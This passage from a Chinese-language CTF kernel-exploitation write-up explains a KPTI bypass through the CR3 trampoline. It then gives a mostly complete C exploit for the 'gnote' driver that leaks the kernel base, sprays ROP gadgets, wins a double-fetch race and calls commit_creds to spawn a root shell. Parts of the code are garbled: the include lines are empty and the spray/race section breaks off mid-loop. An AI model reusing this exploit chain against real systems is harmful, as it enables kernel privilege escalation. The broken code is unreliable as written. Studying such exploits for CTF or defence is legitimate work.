       0xffffffffa5e00116:  mov    rdi,cr3
       0xffffffffa5e00119:  jmp    0xffffffffa5e0014f
       0xffffffffa5e0011b:  mov    rax,rdi
       0xffffffffa5e0011e:  and    rdi,0x7ff
       0xffffffffa5e00125:  bt     QWORD PTR gs:0x1d996,rdi
       0xffffffffa5e0012f:  jae    0xffffffffa5e00140
       0xffffffffa5e00131:  btr    QWORD PTR gs:0x1d996,rdi
       0xffffffffa5e0013b:  mov    rdi,rax
       0xffffffffa5e0013e:  jmp    0xffffffffa5e00148
       0xffffffffa5e00140:  mov    rdi,rax
       0xffffffffa5e00143:  bts    rdi,0x3f
       0xffffffffa5e00148:  or     rdi,0x800
       0xffffffffa5e0014f:  or     rdi,0x1000
       0xffffffffa5e00156:  mov    cr3,rdi
       0xffffffffa5e00159:  pop    rax
       0xffffffffa5e0015a:  pop    rdi
       0xffffffffa5e0015b:  pop    rsp
       0xffffffffa5e0015c:  swapgs
       0xffffffffa5e0015f:  sysretq
最终将会执行如下代码：
    mov    rdi,cr3;
    jmp    0xffffffffa5e0014f;
    or     rdi,0x1000;
    mov    cr3,rdi;
    pop    rax;
    pop    rdi;
    pop    rsp;
    swapgs;
    sysretq;
可以看到将 `CR3`与`0x1000`进行或运算，也就完成了 `CR3`寄存器的修改。  
`EXP`如下：
    //$ gcc -O3 -pthread -static -g -masm=intel ./exp.c -o exp
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    size_t user_cs, user_ss, user_rflags, user_sp;
    size_t prepare_kernel =  0x69fe0;
    size_t commit_creds = 0x69df0;
    size_t p_rdi_r = 0x1c20d;
    size_t mv_rdi_rax_p_r = 0x21ca6a;
    size_t p_rcx_r = 0x37523;
    size_t p_r11_p_rbp_r = 0x1025c8;
    size_t kpti_ret = 0x600a4a;
    size_t iretq = 0x0;
    size_t modprobe_path = 0x0;
    size_t xchg_eax_rsp_r = 0x1992a;
    size_t xchg_cr3_sysret = 0x600116;
    int fd;
    int istriggered = 0;
    typedef struct Knote{
        unsigned int ch;
        unsigned int size;
    }gnote;
    void Err(char* buf){
        printf("%s Error\n");
        exit(-1);
    }
    void getshell(){
        if(!getuid()){
            system("/bin/sh");
        }
        else{
            err("Not root");
        }
    }
    void shell()
    {
        istriggered =1;
        puts("Get root");
      char *shell = "/bin/sh";
      char *args[] = {shell, NULL};
      execve(shell, args, NULL);
    }
    void getroot(){
        char* (*pkc)(int) = prepare_kernel;
        void (*cc)(char*) = commit_creds;
        (*cc)((*pkc)(0));
    }
    void savestatus(){
           __asm__("mov user_cs,cs;"
               "mov user_ss,ss;"
               "mov user_sp,rsp;"
               "pushf;"            //push eflags
               "pop user_rflags;"
              );
    }
    void Add(unsigned int sz){
        gnote gn;
        gn.ch = 1;
        gn.size = sz;
        if(-1 == write(fd, &gn, sizeof(gnote))){
            Err("Add");
        }
    }
    void Select(unsigned int idx){
        gnote gn;
        gn.ch = 5;
        gn.size = idx;
        if(-1 == write(fd, &gn, sizeof(gnote))){
            Err("Select");
        }
    }
    void Output(char* buf, size_t size){
        if(-1 == read(fd, buf, size)){
            Err("Read");
        }
    }
    void LeakAddr(){
        int fdp=open("/dev/ptmx", O_RDWR|O_NOCTTY);
        close(fdp);
        sleep(1); // trigger rcu grace period
        Add(0x2e0);
        Select(0);
        char buffer[0x500] = { 0 };
        Output(buffer, 0x2e0);
        size_t vmlinux_addr = *(size_t*)(buffer+0x18)- 0xA35360;
        printf("vmlinux_addr: 0x%llx\n", vmlinux_addr);
        prepare_kernel += vmlinux_addr;
        commit_creds += vmlinux_addr;
        p_rdi_r += vmlinux_addr;
        xchg_eax_rsp_r += vmlinux_addr;
        xchg_cr3_sysret += vmlinux_addr;
        mv_rdi_rax_p_r += vmlinux_addr;
        p_rcx_r += vmlinux_addr;
        p_r11_p_rbp_r += vmlinux_addr;
        kpti_ret += vmlinux_addr;
        printf("p_rdi_r: 0x%llx, xchg_eax_rsp_r: 0x%llx\n", p_rdi_r, xchg_eax_rsp_r);
    getchar();
        puts("Leak addr OK");
    }
    void HeapSpry(){
        char* gadget_mem = mmap((void*)0x8000000, 0x1000000, PROT_READ|PROT_WRITE,
            MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1,0);
        unsigned long* gadget_addr = (unsigned long*)gadget_mem;
        for(int i=0; i ch = 0x9000000; // 0xffffffffc0000000 + (0x8000000+0x1000000)*8 = 0x8000000
            puts("[*] race ...");
        }
    }
    void Double_Fetch(){
        gnote gn;
        pthread_t pthread;
        gn.size = 0x10001;
        pthread_create(&pthread,NULL, race, &gn);
        for (int j=0; j< 0x10000000000; j++)
        {
            gn.ch = 1;
            write(fd, (void*)&gn, sizeof(gnote));
        }
        pthread_join(pthread, NULL);
    }
    int main(){
        savestatus();
        fd=open("proc/gnote", O_RDWR);
        if (fd<0)
        {
            puts("[-] Open driver error!");
            exit(-1);
        }
        LeakAddr();
        HeapSpry();
        Prepare_ROP();
        Double_Fetch();
        return 0;
    }
## 参考
[KERNEL PWN状态切换原理及KPTI绕过](https://bbs.pediy.com/thread-258975.htm)